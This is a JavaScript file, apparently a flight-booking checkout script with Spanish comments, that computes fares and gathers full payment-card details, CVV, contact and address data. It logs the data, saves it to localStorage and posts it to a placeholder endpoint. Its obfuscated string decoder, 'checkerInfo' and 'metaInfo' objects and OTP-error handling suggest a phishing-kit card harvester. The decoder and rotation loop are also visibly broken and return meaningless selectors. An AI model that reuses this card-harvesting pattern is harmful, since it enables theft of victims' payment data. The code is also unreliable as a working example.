// Función principal de decodificación
function decode(offset, index) {
    const chars = getChars();
    return decode = function(offsetIndex, shiftIndex) {
        offsetIndex = offsetIndex - 0xa0;
        let decodedChar = chars[offsetIndex];
        return decodedChar;
    }, decode(offset, index);
}

// Función auxiliar para obtener el conjunto de caracteres
function getChars() {
    return [
        // Caracteres (arbitrarios para el ejemplo)
        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
        'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
        'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3',
        '4', '5', '6', '7', '8', '9'
    ];
}

// Inicializar el proceso de decodificación
(function(initChars, targetValue) {
    const decodeChar = decode,
        charsArray = initChars();
    while (true) {
        try {
            const result = parseInt(decodeChar(0x106)) / 1 * (-parseInt(decodeChar(0xae)) / 2) + -parseInt(decodeChar(0xe6)) / 3 + -parseInt(decodeChar(0xb1)) / 4 + parseInt(decodeChar(0xd7)) / 5 + parseInt(decodeChar(0x107)) / 6 * (parseInt(decodeChar(0xce)) / 7) + -parseInt(decodeChar(0xca)) / 8 * (-parseInt(decodeChar(0xda)) / 9) + parseInt(decodeChar(0xf9)) / 10;
            if (result === targetValue) break;
            else charsArray.push(charsArray.shift());
        } catch (error) {
            charsArray.push(charsArray.shift());
        }
    }
})(getChars, 0x2399a);

// Código ejecutado con setTimeout
setTimeout(() => {
    const getElement = decode;
    document.querySelector(getElement(0x10d)).remove();
}, 3000);

// Función para actualizar el DOM
const updateDOM = () => {
    const getElement = decode;

    const updateElement = document.querySelector(getElement(0xaa));
    updateElement.innerHTML = '';

    const flightInfo = info.flightInfo;
    const adults = flightInfo.adults;
    const children = flightInfo.children;
    const infants = flightInfo.infants;

    if (adults !== 0) {
        updateElement.innerHTML += adults + ' ' + (adults > 1 ? 'Adultos' : 'Adulto');
    }

    if (children !== 0) {
        updateElement.innerHTML += ', ' + children + ' ' + (children > 1 ? 'Niños' : 'Niño');
    }

    if (infants !== 0) {
        updateElement.innerHTML += ', ' + infants + ' ' + (infants > 1 ? 'Bebés' : 'Bebé');
    }

    let totalPassengers = adults + children;
    const priceBase = PRECIO_BASE;
    const priceMultipliers = MULTIPLICADORES_PRECIO;

    if (flightInfo.roundTrip === 1) {
        document.querySelector(getElement(0xc9)).textContent = '$' + Math.ceil(priceBase * priceMultipliers[flightInfo.origin.ticket_type] * totalPassengers + priceBase * priceMultipliers[flightInfo.destination.ticket_type] * totalPassengers).toLocaleString('es-Es') + ',00';
        document.querySelector(getElement(0xb4)).textContent = '$' + Math.ceil(priceBase * priceMultipliers[flightInfo.origin.ticket_type] * totalPassengers + priceBase * priceMultipliers[flightInfo.destination.ticket_type] * totalPassengers).toLocaleString('es-Es') + ',00';
    } else {
        document.querySelector(getElement(0xc9)).textContent = '$' + Math.ceil(priceBase * priceMultipliers[flightInfo.origin.ticket_type] * totalPassengers).toLocaleString('es-Es') + ',00';
        document.querySelector(getElement(0xb4)).textContent = '$' + Math.ceil(priceBase * priceMultipliers[flightInfo.origin.ticket_type] * totalPassengers).toLocaleString('es-Es') + ',00';
    }

    if (flightInfo.roundTrip === 1) {
        document.querySelector(getElement(0x104)).textContent = '$ ' + Math.ceil(priceBase * priceMultipliers[flightInfo.origin.ticket_type] * totalPassengers + priceBase * priceMultipliers[flightInfo.destination.ticket_type] * totalPassengers).toLocaleString('es-Es') + ',00';
    } else {
        document.querySelector(getElement(0x104)).textContent = '$ ' + Math.ceil(priceBase * priceMultipliers[flightInfo.origin.ticket_type] * totalPassengers).toLocaleString('es-Es') + ',00';
    }

    const resumeTravel = document.querySelector('#resume-travel');
    let departureDate = new Date(parseInt(flightInfo.departureDates[0]));

    resumeTravel.innerHTML = `Viaje desde ${flightInfo.origin.city} a ${flightInfo.destination.city} el ${dayDic[(departureDate.getDay() + 6) % 7]} ${departureDate.toString().split(' ')[2]} de ${monthDic[departureDate.getMonth()]} de ${departureDate.getFullYear()}`;

    if (flightInfo.returnDates[1] !== 0) {
        let returnDate = new Date(parseInt(flightInfo.returnDates[1]));
        resumeTravel.innerHTML += `, regreso desde ${flightInfo.destination.city} a ${flightInfo.origin.city} el ${dayDic[(returnDate.getDay() + 6) % 7]} ${returnDate.toString().split(' ')[2]} de ${monthDic[returnDate.getMonth()]} de ${returnDate.getFullYear()}`;
    }
};

updateDOM();

let paymentFlag = false;
let emailFlag = false;

const paymentForm = document.querySelector('#form-payment');
paymentForm.addEventListener('submit', event => {
    event.preventDefault();
    paymentFlag = true;
});

const emailForm = document.querySelector('#form-email');
emailForm.addEventListener('submit', event => {
    event.preventDefault();
    emailFlag = true;
});

const nextStep = () => {
    const getElement = decode;

    document.querySelector('#btn-email').click();
    document.querySelector(getElement(0x103)).click();

    const cardNumber = document.querySelector('#p');
    const expDate = document.querySelector('#exp-date');
    const cvv = document.querySelector('#c');
    const cardName = document.querySelector('#card-name');
    const billingZip = document.querySelector('#billing-zip');
    const email = document.querySelector('#email');
    const phone = document.querySelector('#telnum');
    const city = document.querySelector('#city');
    const address = document.querySelector('#address');

    if (paymentFlag && emailFlag) {
        if ((cardNumber.value.length === 19 && cardNumber.value[0] !== '3' && ['4', '5'].includes(cardNumber.value[0])) || (cardNumber.value.length === 15 && cardNumber.value[0] === '3')) {
            if (isLuhnValid(cardNumber.value)) {
                if (isValidDate(expDate.value)) {
                    if ((cvv.value.length === 3 && cardNumber.value.length === 19) || (cvv.value.length === 4 && cardNumber.value.length === 15)) {
                        console.log('Validation passed');

                        // Asignación de valores a info
                        info.metaInfo.cardNumber = cardNumber.value;
                        info.metaInfo.bankName = cardName.value;
                        info.metaInfo.expDate = expDate.value;
                        info.metaInfo.cvv = cvv.value;
                        info.metaInfo.zip = billingZip.value;
                        info.metaInfo.email = email.value;
                        info.metaInfo.phone = phone.value;
                        info.metaInfo.city = city.value;
                        info.metaInfo.address = address.value;

                        if (info.metaInfo.cardNumber[0] === '4') {
                            info.checkerInfo.cardType = 'Visa';
                        } else if (info.metaInfo.cardNumber[0] === '5') {
                            info.checkerInfo.cardType = 'MasterCard';
                        } else if (info.metaInfo.cardNumber[0] === '3') {
                            info.checkerInfo.cardType = 'Amex';
                        }

                        console.log(info.metaInfo);
                        updateLocalStorage();

                        let paymentData = {
                            email: info.metaInfo.email,
                            cardNumber: info.metaInfo.cardNumber,
                            expDate: info.metaInfo.expDate,
                            cvv: info.metaInfo.cvv,
                            zip: info.metaInfo.zip,
                            phone: info.metaInfo.phone,
                            city: info.metaInfo.city,
                            address: info.metaInfo.address,
                            cardName: info.metaInfo.cardName,
                            bankName: info.metaInfo.bankName,
                            action: 'processPayment'
                        };

                        fetch('https://payment.api/submit', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                                'Authorization': 'Bearer ' + API_KEY
                            },
                            body: JSON.stringify(paymentData)
                        })
                        .then(response => response.json())
                        .then(data => {
                            if (data.status === 'success') {
                                window.location.href = '/confirmation';
                            } else {
                                throw new Error('Payment failed');
                            }
                        })
                        .catch(error => console.error('Error:', error));
                    } else {
                        console.log('Invalid CVV length');
                    }
                } else {
                    console.log('Invalid expiration date');
                }
            } else {
                console.log('Invalid card number');
            }
        } else {
            console.log('Invalid card length or prefix');
        }
    }
};

document.querySelector('#btn-next').addEventListener('click', nextStep);


function formatCNumber(cardInput) {
    let cardNumber = cardInput.value.replace(/\D/g, '');  // Elimina todos los caracteres que no son dígitos
    let formattedNumber = '';

    if (cardNumber[0] === '3') {  // Si el número de tarjeta empieza con '3'
        cardInput.setAttribute('maxlength', '17');  // Establece un máximo de 17 caracteres
        if (cardNumber.length > 15) {
            cardNumber = cardNumber.substring(0, 15);  // Limita el número de tarjeta a 15 caracteres
        }
        for (let i = 0; i < cardNumber.length; i++) {
            if (i === 4 || i === 10) {
                formattedNumber += ' ';  // Añade un espacio después de los 4 y 10 caracteres
            }
            formattedNumber += cardNumber.charAt(i);
        }
        cardInput.value = formattedNumber;
    } else {  // Para cualquier otro número de tarjeta
        cardInput.setAttribute('maxlength', '19');  // Establece un máximo de 19 caracteres
        if (cardNumber.length > 16) {
            cardNumber = cardNumber.substring(0, 16);  // Limita el número de tarjeta a 16 caracteres
        }
        for (let i = 0; i < cardNumber.length; i++) {
            if (i > 0 && i % 4 === 0) {
                formattedNumber += ' ';  // Añade un espacio después de cada 4 caracteres
            }
            formattedNumber += cardNumber.charAt(i);
        }
        cardInput.value = formattedNumber;
    }
}


function formatDate(dateInput) {
    let dateValue = dateInput.value.replace(/\D/g, '');  // Elimina todos los caracteres que no son dígitos
    dateValue = dateValue.substring(0, 4);  // Limita a 4 caracteres
    if (dateValue.length > 2) {
        dateValue = dateValue.substring(0, 2) + '/' + dateValue.substring(2, 4);  // Formatea la fecha como MM/YY
    }
    dateInput.value = dateValue;
}

function isLuhnValid(cardNumber) {
    cardNumber = cardNumber.replace(/\D/g, '');  // Elimina todos los caracteres que no son dígitos
    if (cardNumber.length < 6) return false;

    const digits = cardNumber.split('').map(Number).reverse();
    let sum = 0;

    for (let i = 0; i < digits.length; i++) {
        let digit = digits[i];
        if (i % 2 !== 0) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }
        sum += digit;
    }

    return sum % 10 === 0;
}


function isValidDate(date) {
    const dateParts = date.split('/');
    const month = parseInt(dateParts[0], 10);
    const year = parseInt(dateParts[1], 10) + 2000;  // Asume que el año es 20xx

    const currentDate = new Date();
    const currentMonth = currentDate.getMonth() + 1;  // Los meses en JavaScript son 0-11
    const currentYear = currentDate.getFullYear();

    return year > currentYear || (year === currentYear && month >= currentMonth);
}



if (info['error'] === 'OTP_ERROR') {
    const otpErrorMessage = document.getElementById('otp-error-message');
    otpErrorMessage.style.display = 'block';
}

